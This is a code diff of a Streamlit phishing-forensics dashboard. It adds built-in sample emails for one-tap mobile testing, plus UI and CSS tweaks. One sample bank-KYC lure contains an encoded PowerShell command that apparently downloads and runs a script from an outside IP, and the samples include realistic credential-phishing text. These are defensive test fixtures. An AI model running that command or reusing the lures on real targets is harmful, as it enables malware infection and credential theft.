@@ -23,6 +23,7 @@ abuse_key = st.secrets.get("ABUSEIPDB_API_KEY", "")
 
 eleven_client = ElevenLabs(api_key=elevenlabs_api_key) if elevenlabs_api_key else None
 
+# --- SESSION CONTROLLERS ---
 if "replay" in st.query_params:
     st.query_params.clear()
     st.session_state.intro_done = False
@@ -37,88 +38,88 @@ if "last_played_audio_hash" not in st.session_state:
 if "copilot_history" not in st.session_state:
     st.session_state.copilot_history = []
 
-# --- INTRO PROTECTION LOADING SCREEN ---
+# --- BUILT-IN MOBILE DEMO PAYLOADS (No file download required on phone) ---
+SAMPLE_QUISHING_APT = b"""Received: from relay1.transparent-relay.top (185.220.101.5) by mx.defense-gateway.in;
+Authentication-Results: mx.defense-gateway.in; dkim=none; spf=fail
+From: State Bank Security Desk <alerts@onlinesbi-kyc-update.top>
+To: defense-officer@nic.in
+Subject: [URGENT] Immediate Security Action: Account Verification & KYC Notice
+Date: Sat, 05 Sep 2026 14:10:00 +0530
+
+Dear Officer,
+Your corporate defense allowance credentials have been flagged for unverified KYC compliance.
+Kindly be advised that prompt attention is required. Failure to do so will result in immediate suspension.
+
+Please use your mobile camera to scan QR code in the attached digital slip to re-authorize MFA token:
+https://onlinesbi-kyc-update.top/auth-verify-session?token=SEC99201
+
+Execute administrative bypass token:
+powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcABhAHkAbABvAGEAZAAuAHAAczEiKQ==
+
+State Bank Security Directorate
+"""
+
+SAMPLE_HOMOGLYPH_PAYPAL = b"""Received: from mail.harvester-node.net (194.26.29.112) by mx.enterprise.com;
+Authentication-Results: mx.enterprise.com; dkim=fail; spf=softfail
+From: PayPal Security Department <service@paypa1.com>
+To: accounts-team@enterprise.com
+Subject: Notice: Suspicious $1,420.00 Transaction Reversed - Confirm Identity
+Date: Sat, 05 Sep 2026 11:20:00 +0000
+
+Dear Customer,
+We detected an unauthorized billing request of $1,420.00 originating from an unknown IP address.
+To immediately cancel this unauthorized invoice and restore your account security, login now:
+https://paypa1.com/cgi-bin/webscr-login-verify
+
+If this was not you, password verification is strictly required within 2 hours.
+PayPal Risk Mitigation Team
+"""
+
+SAMPLE_CLEAN_CORP = b"""Received: from mail-relay.google.com (209.85.220.41) by mx.google.com;
+Authentication-Results: mx.google.com; dkim=pass; spf=pass (google.com: domain designates 209.85.220.41 as permitted sender)
+From: IT Operations Desk <it-support@synova-enterprise.internal>
+To: team-all@synova-enterprise.internal
+Subject: Scheduled Cloud Infrastructure Maintenance Window (Sunday 2:00 AM UTC)
+Date: Sat, 05 Sep 2026 09:00:00 +0000
+
+Hi Team,
+This is a standard notification regarding the scheduled system firmware upgrade this weekend.
+All internal cloud services will remain accessible, with a potential 5-minute latency during routing table failover.
+No action is required from employees.
+
+Regards,
+IT Infrastructure Operations
+"""
+
+# --- STEP 1: INITIAL PROTECTION LOADING SCREEN ---
 if not st.session_state.intro_done:
     st.markdown(
         """
         <style>
-        .stApp {
-            background-color: #04070d !important;
-            background-image: 
-                radial-gradient(circle at 50% 50%, rgba(0, 168, 255, 0.15) 0%, transparent 65%),
-                linear-gradient(rgba(0, 168, 255, 0.08) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 168, 255, 0.08) 1px, transparent 1px) !important;
-            background-size: 100% 100%, 40px 40px, 40px 40px !important;
-        }
-        .intro-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            margin-top: 15vh;
-            margin-bottom: 25px;
-        }
-        .intro-shield-svg {
-            width: 120px;
-            height: 140px;
-            fill: none;
-            stroke: #00a8ff;
-            stroke-width: 1.6;
-            stroke-dasharray: 450;
-            stroke-dashoffset: 450;
-            animation: drawIntroShield 2.2s cubic-bezier(0.65, 0, 0.35, 1) forwards;
-            filter: drop-shadow(0 0 20px rgba(0, 168, 255, 0.6));
-        }
-        @keyframes drawIntroShield {
-            0% { stroke-dashoffset: 450; transform: scale(0.9); opacity: 0.3; }
-            80% { stroke-dashoffset: 0; transform: scale(1.04); opacity: 1; }
-            100% { stroke-dashoffset: 0; transform: scale(1); opacity: 1; }
-        }
-        .intro-title {
-            color: #00a8ff;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 20px;
-            font-weight: bold;
-            letter-spacing: 3.5px;
-            margin-top: 22px;
-            text-shadow: 0 0 12px rgba(0, 168, 255, 0.6);
-        }
-        .intro-sub {
-            color: #94a3b8;
-            font-family: monospace;
-            font-size: 13px;
-            letter-spacing: 1.5px;
-            margin-top: 8px;
-        }
+        .stApp { background-color: #04070d !important; }
+        .intro-container { display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; margin-top: 15vh; }
+        .intro-shield-svg { width: 110px; height: 130px; fill: none; stroke: #00a8ff; stroke-width: 1.6; stroke-dasharray: 450; stroke-dashoffset: 450; animation: drawIntroShield 2.2s ease forwards; filter: drop-shadow(0 0 20px rgba(0, 168, 255, 0.6)); }
+        @keyframes drawIntroShield { 0% { stroke-dashoffset: 450; opacity: 0.3; } 100% { stroke-dashoffset: 0; opacity: 1; } }
         </style>
         <div class="intro-container">
-            <svg class="intro-shield-svg" viewBox="0 0 24 28">
-                <path d="M12 2 L3 5.5 V13 C3 19.5 7 24.5 12 26 C17 24.5 21 19.5 21 13 V5.5 Z" />
-                <path d="M12 4.5 L5 7.2 V13 C5 18 8 22.2 12 23.6 C16 22.2 19 18 19 13 V7.2 Z" stroke-dasharray="2 2" stroke-width="0.8"/>
-            </svg>
-            <div class="intro-title">INITIALIZING DEFENSE MATRIX...</div>
-            <div class="intro-sub">CALIBRATING BLOCKCHAIN LEDGER & FORENSIC HEURISTICS</div>
+            <svg class="intro-shield-svg" viewBox="0 0 24 28"><path d="M12 2 L3 5.5 V13 C3 19.5 7 24.5 12 26 C17 24.5 21 19.5 21 13 V5.5 Z" /></svg>
+            <div style="color:#00a8ff; font-family:monospace; font-size:18px; font-weight:bold; letter-spacing:2.5px; margin-top:20px;">CALIBRATING MOBILE & ENTERPRISE SOC MATRIX...</div>
         </div>
         """,
-        unsafe_allow_html=True,
+        unsafe_allow_html=True
     )
-
-    col_l, col_btn, col_r = st.columns([1.5, 1, 1.5])
-    with col_btn:
-        if st.button("⚡ Skip Intro", use_container_width=True):
+    col1, col2, col3 = st.columns([1.5, 1, 1.5])
+    with col2:
+        if st.button("⚡ Skip Calibration", use_container_width=True):
             st.session_state.intro_done = True
             st.rerun()
-
-    progress_bar = st.progress(0)
-    for percent in range(100):
+    p_bar = st.progress(0)
+    for p in range(100):
         time.sleep(0.02)
-        progress_bar.progress(percent + 1)
-
+        p_bar.progress(p + 1)
     st.session_state.intro_done = True
     st.rerun()
 
-# --- STEP 2: SETUP CONTAINERS ---
 header_container = st.container()
 ingestion_container = st.container()
 content_container = st.container()
@@ -132,30 +133,58 @@ results = None
 pulse_duration = "5.0s"
 voice_briefing = "Welcome to Synova Threat Intelligence Matrix. System is online and standby for incoming byte stream."
 
-# --- STEP 3: ZERO-TOUCH INGESTION INTERCEPTOR ---
+# --- STEP 3: MOBILE-OPTIMIZED ZERO-TOUCH INGESTION INTERCEPTOR ---
 with ingestion_container:
-    ingestion_mode = st.radio(
-        "Select Attack Vector Ingestion Method:",
-        ["📁 Safe Byte Upload (.eml / .msg)", "☁️ Zero-Touch Cloud Mailbox (IMAP Direct)", "📝 Raw RFC-822 Stream Paste"],
+    in_mode = st.radio(
+        "Select Threat Ingestion Gateway:",
+        [
+            "📱 1-Tap Mobile Threat Simulator",
+            "📁 Safe File Upload (.eml / .msg / .txt)",
+            "📝 Raw RFC-822 Stream Paste",
+            "☁️ Zero-Touch Cloud Mailbox (IMAP)"
+        ],
         horizontal=True
     )
 
     raw_payload_bytes = None
 
-    if "Upload" in ingestion_mode:
-        uploaded_file = st.file_uploader("Drop a suspicious .eml or .msg file here", type=["eml", "msg"], key="threat_file_input")
+    if "1-Tap" in in_mode:
+        st.caption("📲 **Mobile-Friendly Testing:** Phone par `.eml` file download karne ki zaroorat nahi hai. Niche kisi bhi sample par tap karein:")
+        s_col1, s_col2, s_col3 = st.columns(3)
+        if s_col1.button("🚨 Test 1: Quishing & APT36 Lure", use_container_width=True):
+            raw_payload_bytes = SAMPLE_QUISHING_APT
+        if s_col2.button("⚠️ Test 2: PayPal Homoglyph Spoof", use_container_width=True):
+            raw_payload_bytes = SAMPLE_HOMOGLYPH_PAYPAL
+        if s_col3.button("✅ Test 3: Clean Enterprise Mail", use_container_width=True):
+            raw_payload_bytes = SAMPLE_CLEAN_CORP
+
+    elif "Upload" in in_mode:
+        st.caption("📁 Phone aur Desktop dono par `.eml`, `.msg` aur `.txt` format support karta hai.")
+        uploaded_file = st.file_uploader(
+            "Drop or select file here",
+            type=["eml", "msg", "txt"],
+            key="threat_file_input"
+        )
         if uploaded_file is not None:
             raw_payload_bytes = uploaded_file.getvalue()
 
-    elif "Cloud" in ingestion_mode:
-        st.caption("🔒 **Zero-Download Security:** Inspects email directly inside memory RAM buffer without downloading weaponized binaries onto your endpoint.")
-        c_i1, c_i2, c_i3 = st.columns([1.5, 1.5, 1.2])
-        with c_i1:
-            imap_server = st.text_input("IMAP Server Host", value="imap.gmail.com")
-        with c_i2:
-            imap_email = st.text_input("User / Service Account", placeholder="incident-sandbox@corp.com")
-        with c_i3:
-            imap_password = st.text_input("16-Digit App Password", type="password")
+    elif "Paste" in in_mode:
+        st.caption("📝 Mobile browser me Gmail/Outlook se 'Show Original' / 'View Message' text copy karke yahan paste karein:")
+        raw_stream_text = st.text_area(
+            "Paste raw RFC-822 headers & payload here:",
+            height=130,
+            placeholder="Received: from mail.attacker.net ...\nFrom: attacker@malicious.com ..."
+        )
+        if st.button("⚡ Triage Pasted Stream", use_container_width=True):
+            if raw_stream_text.strip():
+                raw_payload_bytes = raw_stream_text.encode("utf-8")
+
+    else:
+        st.caption("🔒 **Zero-Download Security:** Inspects email directly inside memory RAM buffer without downloading weaponized binaries onto your phone.")
+        ci1, ci2, ci3 = st.columns([1.5, 1.5, 1.2])
+        with ci1: imap_server = st.text_input("IMAP Server Host", value="imap.gmail.com")
+        with ci2: imap_email = st.text_input("User / Service Account", placeholder="incident-sandbox@corp.com")
+        with ci3: imap_password = st.text_input("16-Digit App Password", type="password")
         
         if st.button("🚀 Intercept & Neutralize Unread Threats", use_container_width=True):
             if imap_email and imap_password:
@@ -169,13 +198,6 @@ with ingestion_container:
                         st.error(f"IMAP Handshake Error: {str(e)}")
             else:
                 st.warning("Please provide IMAP credentials to read mailbox buffer.")
-
-    else:
-        st.caption("📝 Inspect raw ASCII/MIME streams copy-pasted directly from webmail headers (Zero Disk footprint).")
-        raw_stream_text = st.text_area("Paste raw RFC-822 headers & payload here:", height=140, placeholder="Received: from mail.attacker.net ...\nFrom: attacker@malicious.com ...")
-        if st.button("⚡ Triage Raw Buffer", use_container_width=True):
-            if raw_stream_text.strip():
-                raw_payload_bytes = raw_stream_text.encode("utf-8")
 
     if raw_payload_bytes and not results:
         with st.spinner("Executing Zero-Disk Forensics, Merkle Anchoring, Deep OSINT & AI Triage Pipeline..."):
@@ -216,7 +238,7 @@ if results is not None:
         pulse_duration = "4.0s"
         voice_briefing = "Forensic inspection complete. Artifact verified clean. Zero threat signatures found."
 
-# --- STEP 5: DYNAMIC CSS & MOBILE RESPONSIVE ENGINE ---
+# --- STEP 5: DYNAMIC CSS & TOUCH-RESPONSIVE MOBILE ENGINE ---
 shield_emoji_svg = f"""<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 28' fill='none'><path d='M12 2 L3 5.5 V13 C3 19.5 7 24.5 12 26 C17 24.5 21 19.5 21 13 V5.5 Z' stroke='{primary_color}' stroke-width='1.2' stroke-opacity='0.45' fill='{primary_color}' fill-opacity='0.05'/><path d='M12 4.5 L5 7.2 V13 C5 18 8 22.2 12 23.6 C16 22.2 19 18 19 13 V7.2 Z' stroke='{primary_color}' stroke-width='0.8' stroke-dasharray='1.5 1.5' stroke-opacity='0.35' fill='none'/></svg>""".replace("#", "%23")
 
 st.markdown(
@@ -256,23 +278,13 @@ st.markdown(
         100% {{ transform: translateY(102vh); opacity: 0.1; }}
     }}
 
-    [data-testid="stAppViewBlockContainer"] {{
-        position: relative;
-        z-index: 2;
-    }}
-
     .live-badge, .replay-badge {{
         display: inline-flex; align-items: center; justify-content: center; gap: 8px;
         background: {glow_rgba} !important; border: 1px solid {primary_color} !important;
         color: {primary_color} !important; font-size: 11px; padding: 6px 14px;
         border-radius: 20px; font-family: 'Courier New', monospace; font-weight: bold;
         letter-spacing: 1.5px; box-shadow: 0 0 15px {glow_rgba}; text-decoration: none !important;
-        cursor: pointer; transition: all 0.25s ease-in-out; white-space: nowrap;
-    }}
-
-    .replay-badge:hover {{
-        background: {primary_color} !important; color: #04070d !important;
-        box-shadow: 0 0 25px {primary_color} !important; transform: translateY(-1px);
+        cursor: pointer; white-space: nowrap;
     }}
 
     .pulse-dot {{
@@ -282,14 +294,8 @@ st.markdown(
     }}
 
     @keyframes socPulse {{
-        0%, 100% {{ transform: scale(0.85); opacity: 0.3; box-shadow: 0 0 2px {primary_color}; }}
-        50% {{ transform: scale(1.35); opacity: 1; box-shadow: 0 0 16px {primary_color}; }}
-    }}
-
-    [data-testid="stFileUploadDropzone"], .stFileUploader section {{
-        background: rgba(8, 14, 26, 0.75) !important; backdrop-filter: blur(16px) !important;
-        border: 1.5px dashed {primary_color} !important; border-radius: 16px !important;
-        box-shadow: 0 0 20px {glow_rgba} !important;
+        0%, 100% {{ transform: scale(0.85); opacity: 0.3; }}
+        50% {{ transform: scale(1.35); opacity: 1; }}
     }}
 
     [data-testid="stMetric"] {{
@@ -297,12 +303,11 @@ st.markdown(
         border: 1px solid {primary_color} !important; border-radius: 12px !important;
         padding: 10px 14px !important; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6) !important;
     }}
-    [data-testid="stMetricValue"] {{ color: {primary_color} !important; font-family: 'JetBrains Mono', monospace !important; font-size: 20px !important; text-shadow: 0 0 12px {primary_color}; }}
+    [data-testid="stMetricValue"] {{ color: {primary_color} !important; font-family: monospace !important; font-size: 20px !important; }}
 
     .soc-terminal {{
         background: rgba(5, 8, 15, 0.95); border: 1px solid {primary_color}; border-left: 4px solid {primary_color};
-        border-radius: 8px; padding: 16px; font-family: 'JetBrains Mono', 'Courier New', monospace;
-        color: #d1d5db; font-size: 13px; line-height: 1.6; box-shadow: 0 0 25px {glow_rgba}; margin-bottom: 20px;
+        border-radius: 8px; padding: 16px; font-family: monospace; color: #d1d5db; font-size: 13px; line-height: 1.6;
     }}
 
     .ttp-card {{
@@ -310,22 +315,12 @@ st.markdown(
         border-radius: 8px; padding: 10px 14px; margin: 6px; min-width: 220px;
     }}
 
-    .timeline-item {{
-        position: relative; padding-left: 24px; border-left: 2px solid {primary_color}; margin-bottom: 14px;
-    }}
-    .timeline-dot {{
-        position: absolute; left: -6px; top: 2px; width: 10px; height: 10px;
-        background: {primary_color}; border-radius: 50%; box-shadow: 0 0 8px {primary_color};
-    }}
-
     .layer-card {{
         background: rgba(10, 18, 32, 0.85); border: 1px solid {primary_color}; border-radius: 8px;
         padding: 12px 16px; margin-bottom: 10px;
     }}
-    .layer-title {{
-        color: {primary_color}; font-size: 13px; font-weight: bold; font-family: monospace; margin-bottom: 4px; text-transform: uppercase;
-    }}
 
+    /* Mobile & Touch Adaptations */
     @media only screen and (max-width: 768px) {{
         .stApp {{ background-size: 100% 100%, 100% 100%, 25px 25px, 25px 25px !important; }}
         h1 {{ font-size: 20px !important; }}
@@ -334,6 +329,7 @@ st.markdown(
         [data-testid="stMetricValue"] {{ font-size: 16px !important; }}
         .ttp-card {{ width: 100% !important; min-width: 100% !important; margin: 4px 0 !important; }}
         .soc-terminal {{ font-size: 11px !important; padding: 10px !important; }}
+        .stButton>button {{ min-height: 44px !important; font-size: 13px !important; }}
     }}
     </style>
     """,
@@ -345,7 +341,7 @@ with header_container:
     col1, col2 = st.columns([3.2, 1.8])
     with col1:
         st.markdown(f"<h1 style='color: white; margin-bottom: 0px;'>🛡️ SYNOVA <span style='color: {primary_color};'>Enterprise SOC</span></h1>", unsafe_allow_html=True)
-        st.markdown("<p style='color: #94a3b8; font-size: 14px; margin-top: 4px;'>Blockchain Merkle Custody, Nation-State Attribution, Deep OSINT, STIX 2.1 & Threat Graph Engine</p>", unsafe_allow_html=True)
+        st.markdown("<p style='color: #94a3b8; font-size: 14px; margin-top: 4px;'>Blockchain Merkle Custody, Multi-Modal Quishing Radar, Deep OSINT, STIX 2.1 & Threat Graph Engine</p>", unsafe_allow_html=True)
     with col2:
         st.markdown(
             f"""
@@ -358,7 +354,7 @@ with header_container:
         )
     st.divider()
 
-# --- STEP 7: DEDICATED SINGLE-DISPATCH AUDIO ENGINE ---
+# --- STEP 7: AUDIO ENGINE ---
 current_audio_hash = hashlib.md5(voice_briefing.encode('utf-8')).hexdigest()
 
 if st.session_state.last_played_audio_hash != current_audio_hash:
@@ -409,8 +405,10 @@ if st.session_state.last_played_audio_hash != current_audio_hash:
                     const unlock = () => {{
                         audio.play();
                         window.parent.document.removeEventListener('click', unlock);
+                        document.removeEventListener('click', unlock);
                     }};
                     window.parent.document.addEventListener('click', unlock, {{ once: true }});
+                    document.addEventListener('click', unlock, {{ once: true }});
                 }});
             }}
         }} else if ('speechSynthesis' in window) {{
@@ -466,10 +464,10 @@ with content_container:
                     </span>
                 </div>
                 <p style="color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 16px;">
-                    SYNOVA is an autonomous, zero-disk cybersecurity forensic engine engineered to intercept, deconstruct, and neutralize high-level email attack vectors. Ingest payloads via safe file drop, raw MIME streaming, or direct cloud IMAP mailbox handshake to execute real-time AI triage, deep Shodan/AbuseIPDB reconnaissance, lookalike domain tracking, Quishing optical decoding, and cryptographic blockchain evidence anchoring.
+                    SYNOVA is an autonomous, zero-disk cybersecurity forensic engine engineered to intercept, deconstruct, and neutralize high-level email attack vectors. Ingest payloads via 1-tap mobile simulators, safe file drop (.eml/.txt), raw MIME streaming, or direct cloud IMAP mailbox handshake to execute real-time AI triage, deep Shodan/AbuseIPDB reconnaissance, lookalike domain tracking, Quishing optical decoding, and cryptographic blockchain evidence anchoring.
                 </p>
                 <div style="display: flex; gap: 10px; flex-wrap: wrap;">
-                    <span style="background: rgba(0, 168, 255, 0.1); border: 1px solid rgba(0, 168, 255, 0.3); color: {primary_color}; font-size: 12px; padding: 6px 12px; border-radius: 6px; font-family: monospace;">1. IN-MEMORY ZERO-DOWNLOAD BUFFER</span>
+                    <span style="background: rgba(0, 168, 255, 0.1); border: 1px solid rgba(0, 168, 255, 0.3); color: {primary_color}; font-size: 12px; padding: 6px 12px; border-radius: 6px; font-family: monospace;">1. 1-TAP MOBILE THREAT SIMULATOR</span>
                     <span style="background: rgba(14, 165, 233, 0.1); border: 1px solid rgba(14, 165, 233, 0.3); color: #38bdf8; font-size: 12px; padding: 6px 12px; border-radius: 6px; font-family: monospace;">2. APT THREAT ACTOR RADAR</span>
                     <span style="background: rgba(168, 85, 247, 0.1); border: 1px solid rgba(168, 85, 247, 0.3); color: #c084fc; font-size: 12px; padding: 6px 12px; border-radius: 6px; font-family: monospace;">3. BLOCKCHAIN MERKLE PROOF ANCHOR</span>
                     <span style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); color: #f87171; font-size: 12px; padding: 6px 12px; border-radius: 6px; font-family: monospace;">4. ACTIVE CANARY COUNTER-STRIKE</span>
@@ -479,9 +477,9 @@ with content_container:
         )
 
         c1, c2, c3, c4 = st.columns(4)
-        with c1: st.metric(label="THEME ALIGNED", value="BLOCKCHAIN", delta="Merkle Anchor")
-        with c2: st.metric(label="DEEP OSINT", value="SHODAN+ABUSE", delta="CVE Tracer")
-        with c3: st.metric(label="SIEM EXPORTER", value="STIX 2.1", delta="YARA Native")
+        with c1: st.metric(label="MOBILE READY", value="1-TAP DEMO", delta="No File Needed")
+        with c2: st.metric(label="THEME MATCH", value="BLOCKCHAIN", delta="Merkle Anchor")
+        with c3: st.metric(label="DEEP OSINT", value="SHODAN+ABUSE", delta="CVE Tracer")
         with c4: st.metric(label="AI COPILOT", value="ACTIVE", delta="L3 Terminal")
 
     else:
@@ -592,7 +590,7 @@ with content_container:
             "🔬 Raw Headers & Hex Dump",
         ])
 
-        # TAB 1: VIS.JS THREAT GRAPH
+        # TAB 1: VIS.JS THREAT GRAPH (Mobile responsive height)
         with tab1:
             st.subheader("🕸️ Autonomous Threat Entity Relationship Graph")
             st.caption("Physics-based interactive graph mapping attacker origin node, relay path, perimeter firewall, and exfiltration C2 endpoints.")
@@ -602,14 +600,14 @@ with content_container:
             shodan_ports = str(results['metadata']['geo_data'].get('open_ports', []))
 
             graph_html = f"""
-            <div id="synovaNetwork" style="width: 100%; height: 420px; background: rgba(5,8,15,0.95); border: 1px solid {primary_color}; border-radius: 8px;"></div>
+            <div id="synovaNetwork" style="width: 100%; height: 380px; background: rgba(5,8,15,0.95); border: 1px solid {primary_color}; border-radius: 8px;"></div>
             <script type="text/javascript" src="https://unpkg.com/vis-network/standalone/umd/vis-network.min.js"></script>
             <script type="text/javascript">
                 const nodes = new vis.DataSet([
                     {{ id: 1, label: 'Attacker Origin\\n{origin_ip}', color: '#ff3355', shape: 'box', font: {{ color: '#fff', face: 'monospace' }} }},
-                    {{ id: 2, label: 'Spoofed Envelope\\n{sender[:22]}...', color: '#ffaa00', shape: 'ellipse', font: {{ color: '#fff' }} }},
+                    {{ id: 2, label: 'Spoofed Envelope\\n{sender[:20]}...', color: '#ffaa00', shape: 'ellipse', font: {{ color: '#fff' }} }},
                     {{ id: 3, label: 'Target SEG Gateway', color: '#00a8ff', shape: 'diamond', font: {{ color: '#fff' }} }},
-                    {{ id: 4, label: 'Phishing Endpoint\\n{first_url[:24]}...', color: '#ff0055', shape: 'triangle', font: {{ color: '#fff' }} }},
+                    {{ id: 4, label: 'Phishing Endpoint\\n{first_url[:22]}...', color: '#ff0055', shape: 'triangle', font: {{ color: '#fff' }} }},
                     {{ id: 5, label: 'Active Services\\nPorts {shodan_ports}', color: '#c084fc', shape: 'box', font: {{ color: '#fff' }} }}
                 ]);
 
@@ -622,13 +620,13 @@ with content_container:
 
                 const container = document.getElementById('synovaNetwork');
                 const data = {{ nodes: nodes, edges: edges }};
-                const options = {{ physics: {{ stabilization: true, barnesHut: {{ springLength: 120 }} }}, edges: {{ font: {{ color: '#94a3b8', size: 10, strokeWidth: 0 }} }} }};
+                const options = {{ physics: {{ stabilization: true, barnesHut: {{ springLength: 100 }} }}, edges: {{ font: {{ color: '#94a3b8', size: 10, strokeWidth: 0 }} }} }};
                 new vis.Network(container, data, options);
             </script>
             """
-            st.components.v1.html(graph_html, height=440)
+            st.components.v1.html(graph_html, height=400)
 
-        # TAB 2: NATION-STATE APT ATTRIBUTION (NEW ADVANCEMENT 1)
+        # TAB 2: NATION-STATE APT ATTRIBUTION
         with tab2:
             st.subheader("🎯 Nation-State APT Adversary Attribution Radar")
             st.caption("Heuristic fingerprinting matches IOCs, operational lures, and infrastructure against known cyber warfare actors.")
@@ -647,7 +645,7 @@ with content_container:
             </div>
             """, unsafe_allow_html=True)
 
-        # TAB 3: BLOCKCHAIN CUSTODY & SMART CONTRACT (NEW ADVANCEMENT 4)
+        # TAB 3: BLOCKCHAIN CUSTODY & SMART CONTRACT
         with tab3:
             st.subheader("⛓️ Cryptographic Chain-of-Custody & Solidity Smart Contract")
             st.caption("Immutable Merkle tree proofs compliant with Bharatiya Sakshya Adhiniyam Sec 63/65B.")
@@ -729,7 +727,7 @@ with content_container:
                         st.markdown(reply_text)
                         st.session_state.copilot_history.append({"role": "assistant", "content": reply_text})
 
-        # TAB 5: ACTIVE DEFENSE - CANARY TRAP (NEW ADVANCEMENT 3)
+        # TAB 5: ACTIVE DEFENSE - CANARY TRAP
         with tab5:
             st.subheader("💣 Active Defense: Autonomous Honeytoken Canary Counter-Strike")
             st.caption("Deploys synthetic poisoned credentials into the adversary's harvesting portal to track their real origin IP upon exfiltration.")
@@ -751,7 +749,7 @@ Beacon Callback: {canary.get('synthetic_beacon')}
                 if st.button("🚀 Trigger Honeytoken Counter-Strike Lure", use_container_width=True):
                     st.success(f"✅ Honeytoken `{canary.get('canary_token')}` successfully staged. Tracking beacon active on CERT-In / SOC gateway.")
 
-        # TAB 6: IN-MEMORY SCRIPT & SHELLCODE DE-OBFUSCATOR (NEW ADVANCEMENT 2)
+        # TAB 6: IN-MEMORY SCRIPT & SHELLCODE DE-OBFUSCATOR
         with tab6:
             st.subheader("🧬 In-Memory Recursive Base64 & PowerShell De-Obfuscator")
             st.caption("Unpacks obfuscated Unicode UTF-16LE scripts, base64 payloads, and hidden command-line execution stubs without running code.")
@@ -854,6 +852,7 @@ alert ip {sender_ip} any -> $HOME_NET any (msg:"SYNOVA_AUTO_BLOCK: Malicious Act
                 "Select Incident Scenario:",
                 ["🛑 Without SYNOVA (Unprotected Perimeter)", "🛡️ With SYNOVA Autonomous SOAR Engine"],
                 horizontal=True,
+                key="kc_sim_radio"
             )
 
             if "Without" in sim_mode:
